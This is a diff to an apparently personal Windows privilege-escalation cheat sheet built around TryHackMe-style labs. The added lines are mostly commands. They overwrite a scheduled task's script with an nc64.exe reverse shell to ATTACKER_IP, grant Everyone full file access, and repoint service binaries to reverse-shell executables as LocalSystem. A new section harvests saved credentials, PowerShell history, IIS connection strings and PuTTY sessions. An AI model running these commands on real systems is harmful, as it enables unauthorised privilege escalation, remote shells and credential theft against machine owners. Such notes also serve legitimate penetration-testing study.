@@ -108,6 +108,18 @@ netstat -ano
 ## some tasks may be scheduled to run at pre-defined times
 schtasks /query /?
 schtasks /query /fo LIST /v
+## It is good to get detailed information about the task. It can be done with the following command
+## Task To Run: & Run As User: are important parameters, you need to see if you can modify the Task to Run
+schtasks /query /tn vulntask /fo list /v
+# to check permissions on the file
+icacls <task_to_run> or <file>
+# to give access to everyone
+icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F
+## simply use this command
+echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
+## while you have to wait for the task to run, you can trigger the task with the following command
+schtasks /run /tn vulntask
+
 
 ## drivers
 dirverquery
@@ -137,7 +149,9 @@ use multi/recon/local_exploit_suggester
 # the following will list the users with read/write privileges
 .\Accesschk.exe /accepteula -uwdq "C:\Program Files\"
 sc qc daclsvc
-sc config binpath="\"C:\PrivEsc\reverse_system.exe\""
+sc config daclsvc binpath="\"C:\PrivEsc\reverse_system.exe\""
+# Abusing insecure service permissions
+sc config THMService binpath="C:\Users\thm-unpriv\rev.exe" obj=LocalSystem
 net stop daclsvc
 net start daclsvc
 
@@ -195,6 +209,7 @@ reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
 
 
 ## Always Install Elevated
+## Windows installer files are used to install applications on the system. They usually run with the privilege level of the user that starts it. But they can be configured to run with elevated privileges if the following registry keys are set & all you need to do is query if these are set and generate a malicious payload with msfvenom and use msfconsole to receive a reverse shell
 reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 ## If the keys are set to one, then generate an .msi payload using msfvenom
@@ -325,4 +340,26 @@ C:\PrivEsc>.\RoguePotato.exe -r 10.18.112.115 -e "C:\PrivEsc\reverse.exe" -l 999
 C:\PrivEsc>whoami
 whoami
 nt authority\local service
+
+
+## Retrieving saved credentials
+cmdkey /list
+runas /savecred /user:admin cmd.exe
+runas /savecred /user:WPRIVESC1\mike.katz cmd.exe
+
+# Powershell history
+type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+
+## exploit IIS web.config file & look for credentials there
+C:\inetpub\wwwroot\web.config
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
+type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
+
+## putty will allow you to store clear text authentication credentials
+reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
+
+## service configurations as registry keys
+req query HKLM\SYSTEM\CurrentControlSet\Services\
+## maily look for ImagePath and Object attributes
+
 
